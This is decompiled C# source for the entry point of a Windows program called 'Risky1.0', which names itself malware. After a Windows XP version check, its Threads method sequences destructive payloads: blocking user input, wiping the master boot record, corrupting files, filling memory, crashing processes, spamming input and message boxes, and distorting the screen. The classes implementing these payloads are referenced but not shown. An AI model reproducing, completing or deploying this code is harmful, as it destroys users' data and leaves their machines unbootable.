using System;
using System.Threading;
using System.Windows.Forms;

namespace Risky1._0;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		if (!os())
		{
			MessageBox.Show("Error: This program is not supported so im sparing you! correct version windows will let you run it.\nit only works in: \n\r\n Windows XP 64x\nWindows XP 32x \n\r\n so, cannot execute this malware.", "Risky1.0.exe - Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			Environment.Exit(0);
		}
		Application.SetCompatibleTextRenderingDefault(false);
		Application.EnableVisualStyles();
		Application.Run((Form)(object)new Form1());
	}

	private static bool os()
	{
		Version version = Environment.OSVersion.Version;
		return (version.Major == 5 && version.Minor == 1) || (version.Major == 5 && version.Minor == 2);
	}

	public static void Threads()
	{
		payloads.BlockInput(fBlockIt: true);
		destruction.wipe_MBR();
		new Thread(payloads.msgbox).Start();
		new Thread(destruction.file_corrupter).Start();
		Thread.Sleep(5000);
		new Thread(payloads.title_change).Start();
		new Thread(payloads.memoryfiller).Start();
		new Thread(payloads.messageBoxSpawner).Start();
		Thread.Sleep(2000);
		new Thread(audio.Audio).Start();
		new Thread(GDI.clear).Start();
		new Thread(GDI.glitches).Start();
		new Thread(GDI.flip).Start();
		Thread.Sleep(3000);
		new Thread(payloads.movecursor).Start();
		Thread.Sleep(2000);
		new Thread(payloads.openfiles).Start();
		new Thread(payloads.input_spam).Start();
		new Thread(GDI.colors).Start();
		Thread.Sleep(10000);
		new Thread(GDI.colors2).Start();
		new Thread(GDI.blackout).Start();
		Thread.Sleep(3000);
		new Thread(destruction.process_crasher).Start();
		Thread.Sleep(20000);
		Thread.Sleep(10000);
		new Thread(GDI.glitches).Start();
		new Thread(GDI.glitch2).Start();
	}
}
